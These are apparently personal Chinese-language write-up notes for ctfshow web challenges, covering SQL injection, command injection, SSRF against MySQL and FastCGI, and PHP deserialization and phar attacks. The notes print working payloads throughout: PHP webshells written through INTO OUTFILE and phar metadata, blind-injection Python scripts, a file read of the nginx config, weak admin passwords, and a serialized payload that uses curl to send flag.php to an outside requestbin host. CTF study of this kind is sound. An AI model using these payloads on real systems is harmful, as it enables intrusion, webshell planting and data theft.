![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676714061634-f1203ee7-05ec-4b23-8370-b16f3a228661.png#averageHue=%23fbfbfb&clientId=u3c4aa95e-20da-4&from=paste&height=448&id=u227bdaf5&originHeight=895&originWidth=1776&originalType=binary&ratio=2&rotation=0&showTitle=false&size=120875&status=done&style=none&taskId=u33dddc5e-0bb9-488d-9242-8c53ebd78e2&title=&width=888)
## web 406(sql注入之16进制)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676716798727-f19ebe31-41fb-40d7-874e-01edb353e1d5.png#averageHue=%23fefdfd&clientId=u3c4aa95e-20da-4&from=paste&height=176&id=Az20x&originHeight=351&originWidth=901&originalType=binary&ratio=2&rotation=0&showTitle=false&size=33600&status=done&style=none&taskId=ubbe0d16d-0877-4ea5-aa7e-cd266068d9b&title=&width=450.5)

- `FILTER_VALIDATE_URL`要求得是合法的url，这个可以多测试一下，只要符合`: // /`就可以
- 猜可能links表是2列，`id`和`url`
- 用内联注释，对`<?php eval($_POST[1]);?>`进行16进制编码
```sql
url=0://1'/**/union/**/select/**/1,0x3c3f3d6576616c28245f504f53545b315d293b3f3e/**/into/**/outfile/**/"/var/www/html/2.php"%23
```

- 蚁剑连接数据库

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676717066041-fbb54504-5b3c-42ae-99e8-1f85ea6d4d8a.png#averageHue=%23efefee&clientId=u3c4aa95e-20da-4&from=paste&height=374&id=ua32d95be&originHeight=747&originWidth=1587&originalType=binary&ratio=2&rotation=0&showTitle=false&size=135120&status=done&style=none&taskId=u6982102c-a9ba-44ec-b735-577400ea72f&title=&width=793.5)

## web 407(论看文档的重要性)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676717894900-ede35d36-fc1a-4e30-bb9b-7c04f452978f.png#averageHue=%23fefefe&clientId=u3c4aa95e-20da-4&from=paste&height=215&id=u4b2f3d71&originHeight=430&originWidth=738&originalType=binary&ratio=2&rotation=0&showTitle=false&size=33212&status=done&style=none&taskId=u308114a8-faf9-4863-a752-c4009900f0b&title=&width=369)

- php中调用静态方法可以不用实例化，直接用`cafe::add`
- 其实我测试的时候add后是需要加`()`的

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676717988102-857fffe0-7858-4f4b-92bc-2fd6691357cd.png#averageHue=%23fbfbfb&clientId=u3c4aa95e-20da-4&from=paste&height=200&id=ub70b257a&originHeight=399&originWidth=1410&originalType=binary&ratio=2&rotation=0&showTitle=false&size=51424&status=done&style=none&taskId=u306c9163-a7f5-404b-b7c2-8118ca9f83a&title=&width=705)

- 要求得是合法的ip，翻文档发现ip可以是ipv6的地址
```php
cafe::add  //这种ipv6会认为是中间省略了0，正好调用了add()方法，我只能说这是真硬凑啊
```
## web 408(filter_var)
[Wh0ale’s Blog](https://wh0ale.github.io/) p神博客<br />[https://wh0ale.github.io/2019/08/21/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/](https://wh0ale.github.io/2019/08/21/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/)
:::info
非法字符可以放在双引号里面绕过检测
:::
```php
<?php
var_dump(filter_var('is not allowed@example.com',FILTER_VALIDATE_EMAIL));
var_dump(filter_var('"is.\ not\ allowed"@example.com',FILTER_VALIDATE_EMAIL));
  ?>
```

## web 409(闭合php结束语句)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676878914446-2ead3033-6ef2-4e54-a61c-ae9164dcfbf9.png#averageHue=%23fefefd&clientId=uaa753941-d23a-4&from=paste&height=112&id=u3bae516c&originHeight=224&originWidth=749&originalType=binary&ratio=2&rotation=0&showTitle=false&size=25602&status=done&style=none&taskId=u2eba5fbc-ee60-4562-bb23-ddd342ca1b6&title=&width=374.5)
```php
email="flagsystem($_POST[1]);?>"@123.com
```

- 双引号是为了绕过`FILTER_VALIDATE_EMAIL`

## web 415(php函数名不区分大小写)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676881486132-3a70cce4-a760-44ea-9f1f-4d2c0e639b7a.png#averageHue=%23fefdfd&clientId=u867ddd79-7f5e-4&from=paste&height=160&id=u171020d8&originHeight=320&originWidth=630&originalType=binary&ratio=2&rotation=0&showTitle=false&size=24821&status=done&style=none&taskId=u361f1203-c7b8-45fd-ac63-8c9c9a62607&title=&width=315)

- 传入Getflag即可
## web 416(无需实例化调用类方法)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676882569742-869716a0-f072-4baf-831d-12a1e8f4a9a6.png#averageHue=%23fefefd&clientId=u867ddd79-7f5e-4&from=paste&height=249&id=uae943bda&originHeight=498&originWidth=736&originalType=binary&ratio=2&rotation=0&showTitle=false&size=39610&status=done&style=none&taskId=u4dccd46d-5701-490c-99ee-d9e56c34051&title=&width=368)

- 直接用`ctf::flag`可以调用
## web 417(没看懂)
## web 418(;结束命令)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677137087545-79f9b424-a05f-497f-b430-4b00f7032de5.png#averageHue=%23fefdfc&clientId=uc985661c-6374-4&from=paste&height=271&id=ufaf6af83&originHeight=542&originWidth=759&originalType=binary&ratio=2&rotation=0&showTitle=false&size=51056&status=done&style=none&taskId=u43b4e9e1-4625-4933-aeda-b1d337fc7bc&title=&width=379.5)

- 这里我被误导了，$key是字符串，不可能强等于`0x36d`
- 所以只能用else的语句
- 这里理解成`clear($clear)`是会执行`$clear`的命令
- post传值，用分号结束前面的命令
```php
die=0&clear=;echo `cat flag.php flag.txt`
```
## web 419(突破长度限制)
### 方法1：nl
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677138459998-0f7fc69c-ffb9-46c7-946e-052fc71577fe.png#averageHue=%23fefefd&clientId=ubdec205b-5117-4&from=paste&height=110&id=u160a5c93&originHeight=220&originWidth=374&originalType=binary&ratio=2&rotation=0&showTitle=false&size=15256&status=done&style=none&taskId=u1654ae89-802d-4304-a2e5-af40fd1909f&title=&width=187)

- 用`nl ../*`

### 方法2：突破长度限制
[挖洞经验 | 命令注入突破长度限制](https://www.sohu.com/a/208155480_354899)

#### ubuntu环境下测试(kali会有问题)
##### 命令组装

- 当在命令行输入`>echo``>hello`后，实际上相当于创建了2个文件(kali默认会在命令行中进入到这两个文件，需要`ctrl + c`退出)
- 此时再输入`*`，实际上会执行`echo hello`这个命令

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677156677080-2c1cd57a-74d1-47a9-acd3-2c4a21e94550.png#averageHue=%23212120&clientId=u1b5c8770-7e2a-4&from=paste&height=160&id=uab225e1f&originHeight=319&originWidth=773&originalType=binary&ratio=2&rotation=0&showTitle=false&size=51999&status=done&style=none&taskId=uc685b786-b477-488f-a4f4-1f7975b595f&title=&width=386.5)
:::info
当创建的文件名有函数时，`*`会执行命令
:::
**再测试一个**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677156865744-9ffb1c0e-f165-4c71-87db-12fe944ad6be.png#averageHue=%2320201f&clientId=u1b5c8770-7e2a-4&from=paste&height=86&id=ucb291ee2&originHeight=172&originWidth=712&originalType=binary&ratio=2&rotation=0&showTitle=false&size=23825&status=done&style=none&taskId=u44578f35-0663-40e2-a067-05dcb467fea&title=&width=356)

- 也就是执行了`cat d.txt`

**组装ls -l命令**
:::info
当目录下包含`dir -l ls`这3个文件时，执行`dir -l ls a`会将`-l ls`写入`v`中，不会写`v`本身
:::

- 由于`-l`的排序会在`ls`前，所以只能倒序写入

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677157312737-b782a3b5-807a-417b-84f7-79664481dc68.png#averageHue=%23201f1f&clientId=u1b5c8770-7e2a-4&from=paste&height=83&id=ua7f4e7c0&originHeight=166&originWidth=735&originalType=binary&ratio=2&rotation=0&showTitle=false&size=27019&status=done&style=none&taskId=ud364799b-e8f8-4ce0-9b5c-865a48d8ba5&title=&width=367.5)

- 创建`sl`、`l-`、`dir`，此时`*`执行的是`dir l- sl`也就是查看目录，把`*`写入v中

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677157455421-965a2878-58ef-4cd8-a0c9-b7ca99ada91f.png#averageHue=%2320201f&clientId=u1b5c8770-7e2a-4&from=paste&height=148&id=u5cc7bc3d&originHeight=295&originWidth=754&originalType=binary&ratio=2&rotation=0&showTitle=false&size=39945&status=done&style=none&taskId=ucf41a571-ea7f-4d43-8bf6-15610e5f4a9&title=&width=377)
##### 反转命令

- 创建`rev`，此时`*v = rev v`，即对`v`中的字符串进行翻转
- 用`sh`执行`shell`命令

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677157778923-59743333-9119-408e-b7db-d2ce49c282d9.png#averageHue=%23252524&clientId=u1b5c8770-7e2a-4&from=paste&height=222&id=u3566d89f&originHeight=443&originWidth=856&originalType=binary&ratio=2&rotation=0&showTitle=false&size=63490&status=done&style=none&taskId=u1dd4b0b7-1209-4114-badd-5a52966d17b&title=&width=428)

- 这里的`*v`很神奇，它先寻找结尾是`v`的函数，接着寻找结尾是v的文件，我在`w`文件中写的是`t- sl`，并没有被执行

##### 控制顺序

- `ls -t`会根据文件创建的时间输出，比较省力
- <br />
##### 命令续行

- Linux中这种也是可以执行的
- `\\`在shell环境下表示命令拼接

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677159121982-ba1c4ca2-59e5-4c5a-bd7f-11972c4b0d66.png#averageHue=%23232222&clientId=u1b5c8770-7e2a-4&from=paste&height=164&id=u999b41e1&originHeight=327&originWidth=813&originalType=binary&ratio=2&rotation=0&showTitle=false&size=58228&status=done&style=none&taskId=u828193e7-9bc2-400f-b089-f0ad7a130d6&title=&width=406.5)

# 17.CMS
## web 477(CmsEasy_v5.7 代码执行漏洞)

- `/admin`进入后台，弱口令`admin admin`登录
- 在添加自定义标签处，添加`1111111111\";}<?php phpinfo()?>`	
## web 478(phpcms V9.6.0)

- 暂时没找到源码
```php
function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '')
{
	global $image_d;
	$this->att_db = pc_base::load_model('attachment_model');
	$upload_url = pc_base::load_config('system','upload_url');
	$this->field = $field;
	$dir = date('Y/md/');
	$uploadpath = $upload_url.$dir;
	$uploaddir = $this->upload_root.$dir;
	$string = new_stripslashes($value);
	if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
	$remotefileurls = array();
	foreach($matches[3] as $matche)
	{
		if(strpos($matche, '://') === false) continue;
		dir_create($uploaddir);
		$remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);
	}
	unset($matches, $string);
	$remotefileurls = array_unique($remotefileurls);
	$oldpath = $newpath = array();
	foreach($remotefileurls as $k=>$file) {
		if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;
		$filename = fileext($file);
		$file_name = basename($file);
		$filename = $this->getname($filename); //随机化文件名

		$newfile = $uploaddir.$filename;
		$upload_func = $this->upload_func;
		if($upload_func($file, $newfile)) {
			$oldpath[] = $k;
			$GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath.$filename;
			@chmod($newfile, 0777);
			$fileext = fileext($filename);
			if($watermark){
				watermark($newfile, $newfile,$this->siteid);
			}
			$filepath = $dir.$filename;
			$downloadedfile = array('filename'=>$filename, 'filepath'=>$filepath, 'filesize'=>filesize($newfile), 'fileext'=>$fileext);
			$aid = $this->add($downloadedfile);
			$this->downloadedfiles[$aid] = $filepath;
		}
	}
	return str_replace($oldpath, $newpath, $value);
}	
```
```php

<?php
$str = "Is your name O\'reilly?";

// 输出: Is your name O'reilly?
echo stripslashes($str);
?>
```

- 就是反转义。返回一个去除转义反斜线后的字符串（\' 转换为 ' 等等）。双反斜线（\\）被转换为单个反斜线（\）。
```php
$string = new_stripslashes($value);
	if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
```

- 正则要求输入满足`src/href=url.(gif|jpg|jpeg|bmp|png)`
# 18. 代码审计
## web 301(sql注入-查询密码等于输入的密码)
:::info

- 这种看到返回的密码和查询结果一样的就`union `联合查询
- 但我还是记不住
:::
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677571708456-332ebefa-72fa-46f4-86df-792db96a4c47.png#averageHue=%2321201f&clientId=u822a639e-c9b1-4&from=paste&height=567&id=ub92dd009&originHeight=1133&originWidth=1827&originalType=binary&ratio=2&rotation=0&showTitle=false&size=208834&status=done&style=none&taskId=uff778198-8c81-45dc-ab82-adc26db75d7&title=&width=913.5)
## web 303(insert 注入)
:::info

- 有过滤立刻换位置，不要在一个地方等死
:::
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677573001759-6b6c4f48-9895-4018-a812-66919c3a3d34.png#averageHue=%23211f1f&clientId=u822a639e-c9b1-4&from=paste&height=646&id=u1ef88124&originHeight=1292&originWidth=1829&originalType=binary&ratio=2&rotation=0&showTitle=false&size=230007&status=done&style=none&taskId=uc6085280-68a5-40c3-aff1-f0f692429e1&title=&width=914.5)

- 这里发现不能用`union`联合查询了，那就换
- 在`dptadd.php`中发现注入点

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677573079464-39cb6b66-8622-4850-b9d7-be706fb4f443.png#averageHue=%23252220&clientId=u822a639e-c9b1-4&from=paste&height=385&id=u1f7fde5a&originHeight=770&originWidth=1895&originalType=binary&ratio=2&rotation=0&showTitle=false&size=239033&status=done&style=none&taskId=u0255f536-5b4b-44a9-8380-cae2ed23b54&title=&width=947.5)

- 先万能密码登录后台，接着访问这个界面，爆破信息
```sql
dpt_name=1',sds_address=(select group_concat(flag) from sds_fl9g)#
```
## web 307(多看反序列化的其他函数)
:::info
常用管理员密码<br />admin1<br />admin<br />admin123456
:::
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677594079618-87529ac6-4cfa-4767-958d-cf54ff545a79.png#averageHue=%23211f1f&clientId=u6ddaf6b9-41a7-4&from=paste&height=350&id=u5588089d&originHeight=699&originWidth=1408&originalType=binary&ratio=2&rotation=0&showTitle=false&size=124781&status=done&style=none&taskId=u6974dd7b-cccb-4485-a752-7ff5b55be02&title=&width=704)

- 发现这里的代码调用`clearCache`
- 发现这里有`shell_exec`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677594126057-81cfbdc2-d4ea-4a9b-8479-2042e4994f89.png#averageHue=%231f1e1e&clientId=u6ddaf6b9-41a7-4&from=paste&height=91&id=u4a9a19cb&originHeight=182&originWidth=1264&originalType=binary&ratio=2&rotation=0&showTitle=false&size=25065&status=done&style=none&taskId=ua8eb15be-e006-4203-bf10-15580d6d370&title=&width=632)

- `requestbin`带出
```php
<?php

class dao{
	private $config;
	public function __construct(){
		$this->config=new config();

	}

}
class config{

	public $cache_dir = ';curl -X POST -d "flag=`cat /var/www/html/flag.php`" http://requestbin.cn:80/1mrfw6x1';
	
}
$a = new dao;
echo (base64_encode(serialize($a)));

?>
```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677593997116-4d430019-2d77-44c6-a265-a3899eb2f60a.png#averageHue=%23fefdfd&clientId=u6ddaf6b9-41a7-4&from=paste&height=356&id=u97a6ee8e&originHeight=712&originWidth=1681&originalType=binary&ratio=2&rotation=0&showTitle=false&size=95618&status=done&style=none&taskId=ua8339854-3b88-49d1-8d82-1bf5f195aab&title=&width=840.5)
## web 308(ssrf+mysql)
:::info
dict://127.0.0.1:6379 测试开了哪个端口
:::
:::info

- 看到`curl_exec`就想到gopher打mysql
:::
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677641739696-0d84311f-1a0c-4b5a-aa04-e25e9960de0f.png#averageHue=%23232221&clientId=u96069ca6-5288-4&from=paste&height=293&id=u7a79c846&originHeight=585&originWidth=1076&originalType=binary&ratio=2&rotation=0&showTitle=false&size=112653&status=done&style=none&taskId=u3bbcfb08-7d70-4327-81c6-fee268deae9&title=&width=538)

- 这里可以`ssrf`
- 利用`gopherus`生成payload打mysql
```shell
python2 gopherus.py --exloit -mysql
```

- mysql 一句话木马
```sql
select '<?php eval($_POST[1]);)?>' into outfile '/var/www/html/a.php'
```

- 传入cookie即可
## web 309(ssrf + fastcgi)
[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写 | 离别歌](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#php-fpmfastcgi)
### fastcgi
:::info

- 总结来说是在服务器中间件和后端之间进行传输的协议
:::
![1677656241910.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677656268747-f83060c0-5bb9-426e-bb1e-de701cc2d02c.png#averageHue=%23fcf5f1&clientId=ubb56417b-0d74-4&from=paste&height=359&id=u1b4ccbbf&originHeight=717&originWidth=1488&originalType=binary&ratio=2&rotation=0&showTitle=false&size=118505&status=done&style=none&taskId=u9fd1c49f-65a7-4aef-a449-4745b53b4a0&title=&width=744)

- Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。
- HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。
- 类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件
### PHP-FPM（FastCGI进程管理器）

- 那么，PHP-FPM又是什么东西？
- FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。
- FPM按照fastcgi的协议将TCP流解析成真正的数据。
- 举个例子，用户访问[http://127.0.0.1/index.php?a=1&b=2](http://127.0.0.1/index.php?a=1&b=2)，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：
```php
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
}
```

- 这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。
- PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行**SCRIPT_FILENAME**的值指向的PHP文件，也就是/var/www/html/index.php。
:::info

- 这里**SCRIPT_FILENAME**至关重要**，**如果我能和PHP-FPM通信，构造fastcgi协议数据包，把**SCRIPT_FILENAME**变成我想让他执行的文件
- PHP-FPM默认监听**9000端口**，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。
- 此时，SCRIPT_FILENAME的值就格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404：
:::
### 任意代码执行漏洞
**security.limit_extensions**：限定了只有某些后缀的文件允许被fpm执行，默认是.php

1. 步骤1：
- 由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。
2. 步骤2：
- 设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。-
- 所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）
3. 步骤3：

那么，我们怎么设置auto_prepend_file的值？

- 这又涉及到PHP-FPM的两个环境变量，`**PHP_VALUE**`和`**PHP_ADMIN_VALUE**`。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项

所以，我们最后传入如下环境变量：

```php
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
```

- 设置`auto_prepend_file = php://input`且`allow_url_include = On，`然后将我们需要执行的代码放在Body中，即可执行任意代码。
- 上面的所有`payload`可以用`gopherus`生成
## wen 310(file://读配置文件)

- 9000端口关着，无法用`fastcgi`
- 读一下`nginx`的配置文件，位置在`/etc/nginx/nginx.conf`
```php
<?php
class config{
	public $update_url = 'file:///etc/nginx/nginx.conf';
}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo base64_encode(serialize($a));
?>

```
![1677741919670.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677741930401-6eedf9b4-1322-42be-a538-09367448e841.png#averageHue=%23fcfbfa&clientId=u660710b8-790c-4&from=paste&height=154&id=ua73406a8&originHeight=308&originWidth=988&originalType=binary&ratio=2&rotation=0&showTitle=false&size=21579&status=done&style=none&taskId=uc890c0a1-f77d-4023-8d00-655cb5212bc&title=&width=494)

- 把`$update_url='http://127.0.0.1:4476';`访问4476端口读取flag
## 总结
![](https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1677742506408-e2219477-7706-4306-868e-cb2f64760ccb.jpeg)
# web 498（ssrf + redis6379）
![1678283214348.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678283256477-27b181d3-5eeb-4d92-85e6-7a691f4640b7.png#averageHue=%23262d39&clientId=u51edd83c-1f83-4&from=paste&height=417&id=u77953fb6&originHeight=917&originWidth=2391&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=974902&status=done&style=none&taskId=u1cc8f42c-71fa-4f93-9dec-57358076280&title=&width=1086.8181582620327)
# 中期测评
## web 486(莫名其妙的登录框-目录穿越)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677757105236-5f8396e1-17ea-4fea-afe5-946ea899b6c7.png#averageHue=%23f8f8f8&clientId=u7bbfe111-bd42-4&from=paste&height=309&id=u5eada6d0&originHeight=618&originWidth=2472&originalType=binary&ratio=2&rotation=0&showTitle=false&size=49914&status=done&style=none&taskId=u074cb0ee-8616-4530-98c5-97f3ad8fa71&title=&width=1236)

- 随便访问一个目录，发现`action in /var/www/html`
- 那直接目录穿越`action=../flag`
## web 487(sql时间盲注)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677765034886-9fca7f1c-86f2-4bd2-a8c8-656c1166a8a4.png#averageHue=%23f8f8f8&clientId=u7bbfe111-bd42-4&from=paste&height=143&id=u802abff6&originHeight=285&originWidth=1362&originalType=binary&ratio=2&rotation=0&showTitle=false&size=9875&status=done&style=none&taskId=ue440622b-9367-4838-b520-e4e202964b0&title=&width=681)

- 发现是它是`file_get_contents`，那让它读一下`../index.php`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677765087488-840dfe7f-6708-4de0-84f2-01ed3793b6ca.png#averageHue=%23fcfafa&clientId=u7bbfe111-bd42-4&from=paste&height=302&id=u80689ac1&originHeight=603&originWidth=1272&originalType=binary&ratio=2&rotation=0&showTitle=false&size=31047&status=done&style=none&taskId=u6e143848-6009-42a8-8281-a4d1bf48626&title=&width=636)

- 不知道咋闭合，就测试时间盲注

## web 489(extract之时间盲注)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678073238534-9603fbeb-9225-4e23-8789-2b6424be6308.png#averageHue=%23fbfafa&clientId=u9d9d9d31-61a8-4&from=paste&height=173&id=u83f93166&originHeight=345&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=20485&status=done&style=none&taskId=u1963ef83-f393-40e6-b6cb-2825d356619&title=&width=640)

- 这里`$sql`是可以被执行的，那么我就可以用extract变量覆盖`$sql`，变成我要执行的语句，测时间盲注
```python
import requests

url = 'http://c7c04ce0-0dac-425e-a512-d84a94273ea4.challenge.ctf.show/index.php?action=check&username=1&password=1&sql=select '
flag = 'ctfshow{'
i = 0
target = 'abcdef0123456789-}'
for i in range(9,45):
    for j in target:
        payload = f"if(substr((select load_file('/flag')),{i},1)='{j}',sleep(3),0)"
        try:
            requests.get(url + payload, timeout=0.5)
            
        except:
            flag += j
            print(flag)
            break
```
## web 496(session_sql注入)
:::info
在有信息改动的页面要抓包
:::

- `1' || 1=1#`进入后台

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678193562556-3ca6678d-8b4e-4333-bfb0-32966242aac0.png#averageHue=%23af9975&clientId=ud48b4823-919e-4&from=paste&height=487&id=ub0bdcb23&originHeight=1072&originWidth=2376&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=164074&status=done&style=none&taskId=ue30e8616-10b0-4b46-8be2-d47664342e0&title=&width=1079.999976591631)

- 发现这里可以改，抓包发现跳转到`/api/admin_edit.php`界面，查看源码
```php
///api/admin_edit.php
if($user){
	extract($_POST);
	$sql = "update user set nickname='".substr($nickname, 0,8)."' where username='".$user['username']."'";
	$db=new db();
	if($db->update_one($sql)){
		$_SESSION['user']['nickname']=$nickname;
		$ret['msg']='管理员信息修改成功';
	}else{
		$ret['msg']='管理员信息修改失败';
	}
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}

```

- 在`update`处可以注入，但是发现这里的`user`需要是已登录的`user`，所以在写脚本时，需要先登录，获取`session`，再用`session.post`访问该界面
```php
import requests
import random
import time
url = "http://e546f3e5-2c20-40fb-990d-110596892ab0.challenge.ctf.show/api/admin_edit.php"
url2 = 'http://e546f3e5-2c20-40fb-990d-110596892ab0.challenge.ctf.show/index.php?action=check'
result = ''
i = 0
data={
    "username":"' || 1#",
    "password":1
}
session=requests.session()
session.post(url=url2,data=data)
while True:
    i = i + 1
    head = 32
    tail = 127
#flagyoudontknow76 flagisherebutyouneverknow118
    while head < tail:
        mid = (head + tail) >> 1
        payload = {
            'username' : '1',
            'nickname' : f'{random.randint(0, 99999)}',
            'user[username]' : f"1' || 1=if(ascii(substr((select flagisherebutyouneverknow118 from flagyoudontknow76),{i},1))>{mid},1, 0)#"
            }
        r = session.post(url = url, data=payload)
        if 'u529f' in r.text:
          head = mid + 1
        else:
          tail = mid
    if head != 32:
        result += chr(head)
        print(result)
    else:
        break
```
## web 503(phar://反序列化)
### .phar

- .phar（php archive）含义为**php 归档文件**。如果一个由多个文件构成的php应用程序，可以合并打包为一个文件夹，类似于javaweb项目里的**jar文件**。
- 相当于一个压缩包或者jar包，它可以用`phar://`伪协议解压缩
### phar反序列化

- phar存储的**meta-data**信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678435342877-84eb7930-614f-4eed-8246-85af181c298b.png#averageHue=%23f4f5f2&clientId=u5e7ba7e9-411a-4&from=paste&height=209&id=u45451054&originHeight=459&originWidth=1593&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=170892&status=done&style=none&taskId=u5500df33-789b-4008-a8fe-89d9add9cff&title=&width=724.0908933966616)

- 在使用前，需要更改`php.ini`的配置文件

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678436061558-5ec49f27-28cd-4421-9dc4-b7edf2d2c377.png#averageHue=%23eeeceb&clientId=u5e7ba7e9-411a-4&from=paste&height=55&id=u9ecf0701&originHeight=121&originWidth=545&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=5008&status=done&style=none&taskId=u2c42962d-569f-4c1a-87ac-7830a59545c&title=&width=247.7272673579288)
```php
<?php
class db{
    public $log;
    public function __construct(){
        $this->log=new dbLog();
    }
}

class dbLog{
    public $content='<?php eval($_POST[1]);?>';
    public $log='/var/www/html/a.php';
}

$a = new db();

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件,压缩test.txt文件，文件内容是test
//签名自动计算
$phar->stopBuffering();
```
### web 503
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678435615079-945fcb3f-4475-4271-8f37-5cf786769f29.png#averageHue=%23fdfcfb&clientId=u5e7ba7e9-411a-4&from=paste&height=259&id=u57fb410d&originHeight=569&originWidth=1383&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=76635&status=done&style=none&taskId=u3490714b-4d90-4608-97b4-ef14c72278f&title=&width=628.6363500110377)

- 这里存在`file_exists`可以触发`phar`反序列化

